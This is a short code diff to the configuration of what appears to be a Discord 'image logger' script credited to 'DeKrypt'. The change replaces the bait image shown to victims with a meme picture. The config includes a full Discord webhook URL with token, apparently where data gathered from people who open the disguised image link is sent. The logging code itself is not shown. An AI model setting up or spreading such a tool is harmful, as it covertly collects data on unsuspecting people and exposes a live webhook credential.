@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334994830517993552/MpqAcsKa13aPyH74rT6Ttfpj4TBFAeKoC0NVWI4AF24TmPOmZK-A6HTaJTbb8JwA-vqm",
-    "image": "https://cdn.discordapp.com/attachments/1330778711007559742/1334992547432366173/SmartSelect_20250126_230958_TikTok.png?ex=679e8c32&is=679d3ab2&hm=065300f51d4860f1835d0a41a8cc532aa1cf55cc2247d8e3af3a0164145990d5&", # You can also have a custom image by using a URL argument
+    "image": "https://thunderdungeon.com/wp-content/uploads/2024/10/anime-memes-topimage-20241003.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
